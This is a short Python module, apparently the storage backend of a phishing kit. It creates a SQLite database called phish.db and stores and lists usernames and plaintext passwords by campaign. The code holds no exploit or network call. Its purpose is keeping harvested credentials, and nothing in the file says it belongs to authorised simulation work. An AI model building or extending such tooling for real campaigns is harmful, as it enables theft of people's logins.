import sqlite3
import os

DB_PATH = "db/phish.db"

def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''CREATE TABLE credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign TEXT,
            username TEXT,
            password TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )''')
        conn.commit()
        conn.close()

def store_credentials(campaign, username, password):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO credentials (campaign, username, password) VALUES (?, ?, ?)",
              (campaign, username, password))
    conn.commit()
    conn.close()

def get_credentials():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT campaign, username, password, timestamp FROM credentials")
    data = c.fetchall()
    conn.close()
    return data
